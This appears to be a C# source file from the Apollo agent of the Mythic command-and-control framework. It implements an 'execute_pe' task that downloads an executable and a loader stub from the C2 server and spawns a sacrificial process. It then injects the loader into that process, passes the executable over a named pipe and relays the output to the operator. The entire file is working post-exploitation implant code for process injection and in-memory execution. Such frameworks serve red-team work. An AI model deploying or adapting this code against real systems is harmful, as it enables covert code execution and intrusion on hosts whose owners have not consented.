#define COMMAND_NAME_UPPER

#if DEBUG
#define EXECUTE_PE
#endif

#if EXECUTE_PE

using System;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using ApolloInterop.Serializers;
using System.Threading;
using System.Collections.Concurrent;
using System.IO.Pipes;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Classes.Core;
using ApolloInterop.Utils;
using System.Threading.Tasks;
using ApolloInterop.Classes.Events;
using System.ComponentModel;
using ApolloInterop.Classes.Collections;
using System.Linq;

namespace Tasks
{
    public class execute_pe : Tasking
    {

#pragma warning disable 0649
        [DataContract]
        internal struct ExecutePEParameters
        {
            [DataMember(Name = "pipe_name")]
            public string PipeName;
            [DataMember(Name = "pe_name")]
            public string PEName;
            [DataMember(Name = "commandline")]
            public string CommandLine;
            [DataMember(Name = "loader_stub_id")]
            public string LoaderStubId;
            [DataMember(Name = "pe_id")]
            public string PeId;
        }
#pragma warning restore 0649

        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private JsonSerializer _serializer = new JsonSerializer();
        private AutoResetEvent _complete = new AutoResetEvent(false);
        private Action<object> _sendAction;

        private Action<object> _flushMessages;
        private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();
        private bool _completed = false;
        private System.Threading.Tasks.Task flushTask;
        public execute_pe(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {
            _sendAction = (object p) =>
            {
                PipeStream ps = (PipeStream)p;
                while (ps.IsConnected && !_cancellationToken.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                    _senderEvent,
                    _cancellationToken.Token.WaitHandle
                    });
                    if (!_cancellationToken.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
                    {
                        try
                        {
                            ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
                        }
                        catch
                        {
                            ps.Close();
                            _complete.Set();
                            return;
                        }

                    }
                    else if (!ps.IsConnected)
                    {
                        ps.Close();
                        _complete.Set();
                        return;
                    }
                }
                ps.Close();
                _complete.Set();
            };

            _flushMessages = (object p) =>
            {
                string output = "";
                while (!_cancellationToken.IsCancellationRequested && !_completed)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                        _complete,
                        _cancellationToken.Token.WaitHandle
                    }, 2000);
                    output = string.Join("", _assemblyOutput.Flush());
                    if (!string.IsNullOrEmpty(output))
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(
                            CreateTaskResponse(
                                output,
                                false,
                                ""));
                    }
                }
                while (true)
                {
                    System.Threading.Tasks.Task.Delay(1000).Wait(); // wait 1s
                    output = string.Join("", _assemblyOutput.Flush());
                    if (!string.IsNullOrEmpty(output))
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(
                            CreateTaskResponse(
                                output,
                                false,
                                ""));
                    }
                    else
                    {
                        DebugHelp.DebugWriteLine($"no longer collecting output");
                        return;
                    }
                }

            };
        }

        public override void Kill()
        {
            _completed = true;
            _complete.Set();
            flushTask.Wait();
            _cancellationToken.Cancel();
        }


        public override void Start()
        {
            MythicTaskResponse resp;
            Process? proc = null;
            try
            {
                ExecutePEParameters parameters = _jsonSerializer.Deserialize<ExecutePEParameters>(_data.Parameters);

                DebugHelp.DebugWriteLine("Starting execute_pe task");
                DebugHelp.DebugWriteLine($"Task Parameters: {_data.Parameters}");
                DebugHelp.DebugWriteLine($"Executable name: {parameters.PEName}");
                DebugHelp.DebugWriteLine($"Process command line: {parameters.CommandLine}");

                if (string.IsNullOrEmpty(parameters.LoaderStubId) || string.IsNullOrEmpty(parameters.PEName) || string.IsNullOrEmpty(parameters.PipeName))
                {
                    throw new ArgumentNullException($"One or more required arguments was not provided.");
                }

                byte[]? peBytes;

                if (!string.IsNullOrEmpty(parameters.PeId))
                {
                    if (!_agent.GetFileManager().GetFileFromStore(parameters.PeId, out peBytes))
                    {
                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.PeId, out peBytes))
                        {
                            _agent.GetFileManager().AddFileToStore(parameters.PeId, peBytes);
                        }
                    }
                }
                else
                {
                    _agent.GetFileManager().GetFileFromStore(parameters.PEName, out peBytes);
                }

                peBytes = peBytes ?? throw new InvalidOperationException($"${parameters.PEName} is not loaded (have you registered it?)");
                if (peBytes.Length == 0)
                {
                    throw new InvalidOperationException($"{parameters.PEName} has a zero length (have you registered it?)");
                }

                if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exePEPic))
                {
                    throw new InvalidOperationException($"Failed to download assembly loader stub (with id: {parameters.LoaderStubId}");
                }

                ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);

                proc = _agent.GetProcessManager()
                    .NewProcess(
                        info.Application,
                        info.Arguments,
                        true
                    ) ?? throw new InvalidOperationException($"Process manager failed to create a new process {info.Application}");

                //proc.OutputDataReceived += Proc_DataReceived;
                //proc.ErrorDataReceieved += Proc_DataReceived;
                //proc.Exit += Proc_Exit;

                if (!proc.Start())
                {
                    throw new InvalidOperationException($"Failed to start sacrificial process {info.Application}");
                }

                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse("", false, messages:
                        [
                            Artifact.ProcessCreate((int)proc.PID, info.Application, info.Arguments)
                        ]
                    )
                );

                if (!proc.Inject(exePEPic))
                {
                    throw new ExecuteAssemblyException($"Failed to inject loader into sacrificial process {info.Application}.");
                }

                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse("", false, messages:
                        [
                            Artifact.ProcessInject((int)proc.PID, _agent.GetInjectionManager().GetCurrentTechnique().Name)
                        ]
                    )
                );

                var cmdargs = new ExecutePEIPCMessage()
                {
                    Executable = peBytes,
                    ImageName = parameters.PEName,
                    CommandLine = parameters.CommandLine,
                };

                var client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
                client.ConnectionEstablished += Client_ConnectionEstablished;
                client.MessageReceived += Client_MessageReceived;
                client.Disconnect += Client_Disconnet;

                if (!client.Connect(10000))
                {
                    throw new ExecuteAssemblyException($"Injected assembly into sacrificial process: {info.Application}.\n Failed to connect to named pipe: {parameters.PipeName}.");
                }

                IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
                foreach (IPCChunkedData chunk in chunks)
                {
                    _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
                }

                _senderEvent.Set();
                DebugHelp.DebugWriteLine("waiting for cancellation token in execute_pe.cs");
                WaitHandle.WaitAny(
                [
                    _cancellationToken.Token.WaitHandle,
                ]);
                DebugHelp.DebugWriteLine("cancellation token activated in execute_pe.cs, returning completed");
                resp = CreateTaskResponse("", true, "completed");
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse($"Unexpected Error\n{ex.Message}\n\nStack trace: {ex.StackTrace}", true, "error");
                _cancellationToken.Cancel();
            }

            if (proc is Process procHandle)
            {
                if (!procHandle.HasExited)
                {
                    procHandle.Kill();
                    resp.Artifacts = [Artifact.ProcessKill((int)procHandle.PID)];
                }

                if (procHandle.ExitCode != 0)
                {
                    if ((procHandle.ExitCode & 0xc0000000) != 0
                        && procHandle.GetExitCodeHResult() is int exitCodeHResult)
                    {
                        var errorMessage = new Win32Exception(exitCodeHResult).Message;
                        resp.UserOutput += $"\n[*] Process exited with code: 0x{(uint)procHandle.ExitCode:x} - {errorMessage}";
                        resp.Status = "error";
                    }
                    else
                    {
                        resp.UserOutput += $"\n[*] Process exited with code: {procHandle.ExitCode} - 0x{(uint)procHandle.ExitCode:x}";
                    }
                } else
                {
                    resp.UserOutput += $"\n[*] Process exited with code: 0x{(uint)procHandle.ExitCode:x}";
                }
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }

        private void Client_Disconnet(object sender, NamedPipeMessageArgs e)
        {
            _completed = true;
            _complete.Set();
            flushTask.Wait();
            e.Pipe.Close();
            _cancellationToken.Cancel();
        }

        private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
        {
            Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
            flushTask = Task.Factory.StartNew(_flushMessages, _cancellationToken.Token);
        }

        public void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            // Potentially delete this since theoretically the sender Task does everything
            if (pipe.IsConnected && !_cancellationToken.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] data))
            {
                try
                {
                    pipe.EndWrite(result);
                    pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
                }
                catch
                {

                }

            }
        }
        private void Client_MessageReceived(object sender, NamedPipeMessageArgs e)
        {
            IPCData d = e.Data;
            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
            DebugHelp.DebugWriteLine($"adding data to output");
            _assemblyOutput.Add(msg);
        }
    }
}
#endif
